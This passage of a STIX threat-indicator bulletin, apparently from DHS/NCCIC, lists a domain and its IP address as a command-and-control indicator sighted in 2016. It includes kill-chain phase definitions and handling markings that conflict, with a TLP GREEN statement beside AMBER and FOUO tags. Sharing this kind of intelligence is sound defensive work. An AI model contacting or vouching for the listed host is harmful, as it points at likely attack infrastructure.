+c10-qadevtest.net resolved to 69.49.101.19 and according to virustotal has a Detection ratio of  5 / 66</indicator:Description><indicator:Observable id="NCCIC:Observable-607e6c01-9803-46a9-ac93-9d04cb64e530"><cybox:Object id="NCCIC:Object-f71c2f02-ca97-11e5-b757-180373b1f207"><cybox:Properties type="URL" xsi:type="URIObj:URIObjectType"><URIObj:Value>www.c10-qadevtest.net</URIObj:Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChainPhase-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/></indicator:Kill_Chain_Phases><indicator:Handling><marking:Marking><marking:Controlled_Structure>ancestor-or-self::stix:Indicator//node()</marking:Controlled_Structure><marking:Marking_Structure marking_model_name="TLP" xsi:type="simpleMarking:SimpleMarkingStructureType"><simpleMarking:Statement>This Indicator Bulletin is provided "as is" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained within. The DHS does not endorse any commercial product or service, referenced in this bulletin or otherwise. This document is marked TLP: GREEN. Recipients may only share TLP: GREEN information with peers and partner organizations within their sector or community, but not via publicly accessible channels. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp .</simpleMarking:Statement></marking:Marking_Structure><marking:Marking_Structure color="AMBER" xsi:type="tlpMarking:TLPMarkingStructureType"/><marking:Marking_Structure marking_model_name="FOUO" xsi:type="simpleMarking:SimpleMarkingStructureType"><simpleMarking:Statement>FOUO</simpleMarking:Statement></marking:Marking_Structure></marking:Marking></indicator:Handling><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2016-01-27T00:00:00"/></indicator:Sightings></stix:Indicator></stix:Indicators><stix:TTPs><stix:Kill_Chains><stixCommon:Kill_Chain definer="LMCO" id="stix:KillChainPhase-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf"><stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/><stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/><stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/><stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/><stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/><stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/><stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/></stixCommon:Kill_Chain></stix:Kill_Chains></stix:TTPs></stix:STIX_Package>
